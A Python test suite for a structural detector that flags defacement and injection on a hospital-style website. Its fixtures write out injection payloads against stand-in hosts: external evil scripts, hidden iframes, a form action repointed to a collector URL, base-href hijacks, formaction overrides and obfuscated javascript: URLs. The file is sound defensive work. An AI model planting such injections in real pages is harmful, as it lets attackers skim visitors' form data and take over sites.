"""Structural detector: catches injections that text and pixel diffs cannot."""

from app.services.diff.structure import compare_structure, extract_structure

BASE_URL = "https://hospital.example.com/th/home"

CLEAN_PAGE = """
<html><head>
  <link rel="stylesheet" href="/assets/site.css">
  <script src="/assets/app.js"></script>
  <script src="https://www.googletagmanager.com/gtag/js?id=G-123"></script>
</head><body>
  <main><h1>Welcome</h1></main>
  <a href="/th/contact">Contact</a>
  <a href="https://partner.example.org/info">Partner</a>
  <form action="/th/appointment" method="post"><input name="name"></form>
</body></html>
"""


def facts(html: str, allowed: tuple[str, ...] = ()) -> set[str]:
    return extract_structure(html, BASE_URL, allowed)


def test_injected_external_script_is_detected():
    defaced = CLEAN_PAGE.replace(
        "</body>", '<script src="https://evil.example.net/payload.js"></script></body>'
    )

    diff = compare_structure(facts(CLEAN_PAGE), facts(defaced))

    assert diff.changed
    assert diff.score > 0.0
    assert any("evil.example.net/payload.js" in fact for fact in diff.added)
    assert diff.removed == ()
    assert "evil.example.net" in diff.summary


def test_hidden_iframe_is_detected_even_though_it_is_invisible():
    """A display:none iframe moves no pixels and contributes no text."""
    defaced = CLEAN_PAGE.replace(
        "</body>",
        '<iframe src="https://evil.example.net/frame" style="display:none"></iframe></body>',
    )

    diff = compare_structure(facts(CLEAN_PAGE), facts(defaced))

    assert any(fact.startswith("iframe:") and "evil.example.net" in fact for fact in diff.added)


def test_hidden_spam_links_are_detected_by_host():
    """inner_text() skips display:none nodes, so text diff cannot see these."""
    defaced = CLEAN_PAGE.replace(
        "</body>",
        '<div style="display:none">'
        '<a href="https://spam-pharma.example.net/a">buy</a>'
        '<a href="https://spam-pharma.example.net/b">buy</a>'
        "</div></body>",
    )

    diff = compare_structure(facts(CLEAN_PAGE), facts(defaced))

    # Recorded once per host, not once per link, so a link farm is one finding.
    assert diff.added == ("link-host:spam-pharma.example.net",)


def test_repointed_form_action_is_detected():
    defaced = CLEAN_PAGE.replace(
        'action="/th/appointment"', 'action="https://evil.example.net/collect"'
    )

    diff = compare_structure(facts(CLEAN_PAGE), facts(defaced))

    assert any("evil.example.net/collect" in fact for fact in diff.added)
    assert any("/th/appointment" in fact for fact in diff.removed)


def test_meta_refresh_redirect_is_detected():
    defaced = CLEAN_PAGE.replace(
        "<head>", '<head><meta http-equiv="refresh" content="0;url=https://evil.example.net/">'
    )

    diff = compare_structure(facts(CLEAN_PAGE), facts(defaced))

    assert any(fact.startswith("meta-refresh:") for fact in diff.added)


def test_modified_inline_script_is_detected_by_content_hash():
    original = CLEAN_PAGE.replace("</body>", "<script>console.log(1)</script></body>")
    modified = CLEAN_PAGE.replace("</body>", "<script>fetch('//evil.example.net')</script></body>")

    diff = compare_structure(facts(original), facts(modified))

    assert len(diff.added) == 1
    assert len(diff.removed) == 1
    assert diff.added[0].startswith("inline-script:")
    # Only the digest is stored, never the script body.
    assert "evil.example.net" not in diff.added[0]


def test_unchanged_page_reports_no_structural_change():
    diff = compare_structure(facts(CLEAN_PAGE), facts(CLEAN_PAGE))

    assert not diff.changed
    assert diff.score == 0.0
    assert diff.summary == "No structural changes detected."


def test_cache_busting_query_string_is_a_real_change_not_noise():
    """Per-load noise does not exist here: a changed asset URL means a new deploy.

    This is why the structural detector compares URL sets rather than markup —
    a set only moves when the page really references something different.
    """
    redeployed = CLEAN_PAGE.replace("/assets/app.js", "/assets/app.js?v=2")

    diff = compare_structure(facts(CLEAN_PAGE), facts(redeployed))

    assert diff.changed


def test_allowlisted_hosts_are_ignored_including_subdomains():
    allowed = ("googletagmanager.com", "partner.example.org")

    unfiltered = facts(CLEAN_PAGE)
    filtered = facts(CLEAN_PAGE, allowed)

    assert any("googletagmanager.com" in fact for fact in unfiltered)
    assert not any("googletagmanager.com" in fact for fact in filtered)
    assert not any("partner.example.org" in fact for fact in filtered)
    # The site's own assets are still tracked.
    assert any("/assets/app.js" in fact for fact in filtered)


def test_allowlist_does_not_hide_a_lookalike_host():
    """`evil-googletagmanager.com` must not be covered by `googletagmanager.com`."""
    defaced = CLEAN_PAGE.replace(
        "</body>", '<script src="https://evil-googletagmanager.com/x.js"></script></body>'
    )
    allowed = ("googletagmanager.com",)

    diff = compare_structure(facts(CLEAN_PAGE, allowed), facts(defaced, allowed))

    assert any("evil-googletagmanager.com" in fact for fact in diff.added)


def test_relative_and_absolute_urls_for_the_same_asset_match():
    absolute = CLEAN_PAGE.replace(
        'src="/assets/app.js"', 'src="https://hospital.example.com/assets/app.js"'
    )

    diff = compare_structure(facts(CLEAN_PAGE), facts(absolute))

    assert not diff.changed


def test_same_site_links_are_not_recorded_as_outbound_hosts():
    assert not any(
        fact == "link-host:hospital.example.com" for fact in facts(CLEAN_PAGE)
    )


def test_malformed_html_still_yields_what_could_be_parsed():
    broken = '<html><body><script src="https://evil.example.net/x.js"></script><div><p>'

    parsed = extract_structure(broken, BASE_URL)

    assert "script:https://evil.example.net/x.js" in parsed


def test_inline_script_multiline_and_chunked_is_buffered_into_single_digest():
    """Finding CR10-07: multiple handle_data chunks within <script> are buffered together."""
    html = """
    <html><body>
    <script>
        const a = 1;
        const b = 2;
        const c = "foo &amp; bar";
    </script>
    </body></html>
    """
    f = facts(html)
    inline_facts = [fact for fact in f if fact.startswith("inline-script:")]
    assert len(inline_facts) == 1

    # Check that closing unclosed script also flushes
    unclosed = "<html><body><script>const x = 42;"
    f_unclosed = facts(unclosed)
    assert len([fact for fact in f_unclosed if fact.startswith("inline-script:")]) == 1


def test_base_injection_repoints_relative_form_and_assets():
    original = '<form action="submit"></form><script src="app.js"></script>'
    injected = original + '<base href="https://evil.example/collect/">'
    diff = compare_structure(facts(original), facts(injected))
    assert diff.score > 0
    assert "form:https://evil.example/collect/submit" in diff.added
    assert "script:https://evil.example/collect/app.js" in diff.added


def test_first_base_href_wins_and_relative_base_is_resolved():
    html = ('<base target="_blank"><base href="../safe/">'
            '<base href="https://evil.example/"><form action="submit"></form>')
    assert "form:https://hospital.example.com/safe/submit" in facts(html)
    assert not any("evil.example" in fact for fact in facts(html))
    empty = '<base href=""><base href="https://evil.example/"><form action="submit">'
    assert "form:https://hospital.example.com/th/submit" in facts(empty)


def test_base_changes_are_tracked_even_without_url_elements():
    assert compare_structure(facts(""), facts('<base href="/other/">')).changed


def test_srcdoc_changes_are_detected_even_with_allowlisted_fallback_src():
    original = '<iframe src="https://trusted.example/" style="display:none"></iframe>'
    injected = original.replace(
        "<iframe", '<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"'
    )
    allowed = ("trusted.example",)
    diff = compare_structure(facts(original, allowed), facts(injected, allowed))
    assert diff.score > 0
    assert len(diff.added) == 1
    assert diff.added[0].startswith("iframe-srcdoc:")
    assert "alert" not in diff.summary
    modified = injected.replace("alert(1)", "alert(2)")
    assert compare_structure(facts(injected), facts(modified)).changed
    assert not compare_structure(facts(injected), facts(injected)).changed


def test_srcdoc_hashes_decoded_content_and_tracks_empty_attribute():
    assert facts('<iframe srcdoc="&lt;p&gt;Hello&lt;/p&gt;">') == facts(
        '<iframe srcdoc="<p>Hello</p>">'
    )
    assert compare_structure(facts('<iframe>'), facts('<iframe srcdoc="">')).changed


def test_event_handler_addition_modification_and_removal_are_detected():
    clean = '<button>Continue</button>'
    added = '<button onclick="console.log(1)">Continue</button>'
    modified = '<button onclick="console.log(2)">Continue</button>'

    add_diff = compare_structure(facts(clean), facts(added))
    modify_diff = compare_structure(facts(added), facts(modified))
    remove_diff = compare_structure(facts(added), facts(clean))

    assert add_diff.score > 0
    assert modify_diff.score > 0
    assert remove_diff.score > 0
    assert add_diff.added[0].startswith("event-handler:button.onclick:")
    assert "console.log" not in add_diff.summary
    assert not compare_structure(facts(added), facts(added)).changed


def test_javascript_url_is_normalized_hashed_and_never_allowlisted_away():
    first = '<a href="  JavaScript:alert(1) ">Continue</a>'
    normalized = '<a href="javascript:alert(1)">Continue</a>'
    modified = '<a href="javascript:alert(2)">Continue</a>'

    assert not compare_structure(facts(first), facts(normalized)).changed
    diff = compare_structure(facts(normalized, ("example.com",)), facts(modified, ("example.com",)))
    assert diff.score > 0
    assert diff.added[0].startswith("javascript-url:a.href:")
    assert "alert" not in diff.summary


# --- SEC-03: formaction on submit controls ----------------------------------

FORM_WITH_SAVE = '<form action="https://example.com/save">{control}</form>'


def _form(control: str) -> str:
    return FORM_WITH_SAVE.format(control=control)


def test_formaction_addition_modification_and_removal_are_detected():
    plain = _form("<button>Save</button>")
    added = _form('<button formaction="https://collector.example/save">Save</button>')
    modified = _form('<button formaction="https://other.example/save">Save</button>')

    add_diff = compare_structure(facts(plain), facts(added))
    modify_diff = compare_structure(facts(added), facts(modified))
    remove_diff = compare_structure(facts(added), facts(plain))

    assert add_diff.added == ("formaction:https://collector.example/save",)
    assert modify_diff.added == ("formaction:https://other.example/save",)
    assert modify_diff.removed == ("formaction:https://collector.example/save",)
    assert remove_diff.removed == ("formaction:https://collector.example/save",)
    assert not compare_structure(facts(added), facts(added)).changed


def test_formaction_on_input_and_relative_urls_resolve_against_the_base():
    plain = _form('<input type="submit" value="Save">')
    relative = _form('<input type="submit" value="Save" formaction="/th/other">')

    diff = compare_structure(facts(plain), facts(relative))

    assert diff.added == ("formaction:https://hospital.example.com/th/other",)


def test_formaction_only_counts_on_controls_that_can_submit():
    inert_controls = _form(
        '<button type="button" formaction="https://collector.example/button">'
        'No submit</button><button type="reset" '
        'formaction="https://collector.example/reset">Reset</button>'
        '<input type="text" formaction="https://collector.example/text">'
        '<input type="reset" formaction="https://collector.example/input-reset">'
    )
    submit_controls = _form(
        '<button type="submit" formaction="https://collector.example/button">'
        'Submit</button><input type="image" '
        'formaction="https://collector.example/image">'
    )

    assert not any(fact.startswith("formaction:") for fact in facts(inert_controls))
    assert {
        "formaction:https://collector.example/button",
        "formaction:https://collector.example/image",
    } <= facts(submit_controls)


def test_formaction_respects_allowed_hosts_and_detects_empty_override():
    plain = _form("<button>Save</button>")
    allowed = _form('<button formaction="https://pay.example.org/go">Save</button>')

    assert not compare_structure(
        facts(plain, ("example.org",)), facts(allowed, ("example.org",))
    ).changed
    empty = _form('<button formaction="">Save</button>')
    diff = compare_structure(facts(plain), facts(empty))
    assert diff.added == (f"formaction:{BASE_URL}",)


def test_empty_formaction_is_not_confused_with_an_absent_attribute():
    # The form posts to a separate host. An explicit empty formaction instead
    # submits to this document URL and therefore changes the effective target.
    plain = _form("<button>Save</button>")
    override = _form('<button formaction="">Save</button>')

    assert compare_structure(facts(plain), facts(override)).changed


def test_empty_formaction_uses_document_url_even_with_a_base_element():
    plain = (
        '<base href="https://base.example/assets/">'
        '<form action="https://example.com/save"><button>Save</button></form>'
    )
    override = (
        '<base href="https://base.example/assets/">'
        '<form action="https://example.com/save"><button formaction="">Save</button></form>'
    )

    diff = compare_structure(facts(plain), facts(override))

    assert diff.added == (f"formaction:{BASE_URL}",)


def test_formaction_javascript_url_is_reported_once_as_executable():
    code = _form('<button formaction="javascript:alert(1)">Save</button>')

    added = compare_structure(facts(_form("<button>Save</button>")), facts(code)).added

    assert len(added) == 1
    assert added[0].startswith("javascript-url:button.formaction:")


# --- SEC-04: javascript: URLs obfuscated with control characters ------------


def _javascript_url_facts(href: str) -> set[str]:
    found = facts(f'<a href="{href}">Go</a>')
    return {fact for fact in found if fact.startswith("javascript-url:")}


def test_javascript_url_with_tab_newline_or_entities_is_detected():
    canonical = _javascript_url_facts("javascript:void(0)")
    assert len(canonical) == 1

    for href in (
        "java&#9;script:void(0)",
        "java&#10;script:void(0)",
        "java&#13;script:void(0)",
        "java\tscript:void(0)",
        "java\nscript:void(0)",
        "j\ta\nv\ra\tscript:void(0)",
        "JaVa&Tab;ScRiPt:void(0)",
        "&#1;&#32;javascript:void(0)",
        "javascript:void(0)&#9;",
    ):
        assert _javascript_url_facts(href) == canonical, href


def test_obfuscated_javascript_url_addition_raises_a_change():
    clean = '<a href="#">Continue</a>'
    defaced = '<a href="java&#9;script:void(window.auditProbe=1)">Continue</a>'

    diff = compare_structure(facts(clean), facts(defaced))

    assert diff.changed
    expected = _javascript_url_facts("javascript:void(window.auditProbe=1)")
    assert diff.added == tuple(sorted(expected))


def test_non_javascript_urls_are_not_reported_as_executable():
    for href in ("https://example.com/javascript:alert(1)", "/path/java script", "#javascript:x"):
        assert _javascript_url_facts(href) == set(), href


# --- SEC-05: inert -> executable script transitions -------------------------

PROBE = "window.auditProbe = 1"


def _inline(type_attr: str | None) -> str:
    attr = "" if type_attr is None else f' type="{type_attr}"'
    return f"<p>Same page</p><script{attr}>{PROBE}</script>"


def test_inert_script_becoming_executable_is_detected_with_identical_body():
    inert = facts(_inline("text/plain"))

    for live_type in ("text/javascript", "module", None):
        diff = compare_structure(inert, facts(_inline(live_type)))
        assert diff.changed, live_type
        assert len(diff.added) == 1 and len(diff.removed) == 1
    assert compare_structure(facts(_inline("module")), facts(_inline("text/plain"))).changed


def test_script_type_spellings_that_browsers_treat_alike_do_not_flap():
    classic = facts(_inline(None))

    for spelling in (
        "text/javascript",
        "  TEXT/JavaScript  ",
        "text/ecmascript",
        "",
    ):
        assert facts(_inline(spelling)) == classic, spelling
    # HTML script type values are not parsed like Content-Type headers: a MIME
    # parameter changes the entire value, so the script is an inert data block.
    for spelling in (
        "application/javascript; charset=utf-8",
        "text/javascript; charset=utf-8",
        "\u00a0text/javascript\u00a0",
    ):
        inert = facts(_inline(spelling))
        assert inert != classic, spelling
        assert next(iter(inert)).startswith("inline-script[inert]:"), spelling
    assert facts('<script language="javascript">' + PROBE + "</script><p>Same page</p>") == classic
    assert facts(_inline("MODULE")) == facts(_inline("module"))
    assert facts(_inline("module")) != classic
    assert facts(_inline(" module ")) != facts(_inline("module"))


def test_non_classic_scripts_are_labelled_in_facts():
    module = next(iter(facts(_inline("module"))))
    inert = next(iter(facts(_inline("application/json"))))
    importmap = next(iter(facts(_inline("importmap"))))
    speculationrules = next(iter(facts(_inline("speculationrules"))))

    assert module.startswith("inline-script[module]:")
    assert inert.startswith("inline-script[inert]:")
    assert importmap.startswith("inline-script[importmap]:")
    assert speculationrules.startswith("inline-script[speculationrules]:")
    assert next(iter(facts(_inline(None)))).startswith("inline-script:")


def test_external_script_type_changes_are_detected():
    def external(type_attr: str | None) -> str:
        attr = "" if type_attr is None else f' type="{type_attr}"'
        return f'<script{attr} src="/assets/app.js"></script>'

    assert facts(external(None)) == {"script:https://hospital.example.com/assets/app.js"}
    assert facts(external("module")) == {"script[module]:https://hospital.example.com/assets/app.js"}
    assert compare_structure(facts(external("text/plain")), facts(external(None))).changed
    assert compare_structure(facts(external("text/plain")), facts(external("module"))).changed
    assert not compare_structure(facts(external(None)), facts(external("text/javascript"))).changed
